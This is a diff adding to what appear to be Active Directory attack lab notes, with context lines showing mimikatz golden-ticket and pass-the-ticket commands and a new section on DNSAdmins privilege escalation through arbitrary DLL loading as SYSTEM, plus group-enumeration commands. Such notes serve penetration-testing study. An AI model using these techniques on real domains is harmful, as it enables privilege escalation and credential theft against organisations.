@@ -690,3 +690,16 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 - Using mimikatz, inject the ticket.
 - `Invoke-Mimikatz -Command '"kerberos::ptt <TGS GAINED FROM ABOVE>"'`
 - `ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$`
+
+## Domain Privilege Escalation: DNSAdmins
+- It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM.
+- In case the DC also serves as DNS, this will provide us escalation to DA.
+- Need privileges to restart the DNS service.
+
+**Enumerate the members of the DNSAdmin group**
+- `Get-NetGroupMember -GroupName "DNSAdmins"`
+
+**Using ActiveDirectory Module**
+- `Get-ADGroupMember -Identity DNSAdmins`
+
+- Once we know the members of the DNSAdmins group, we need to compromise a member. We already have hash of srvadmin because of derivative local admin.
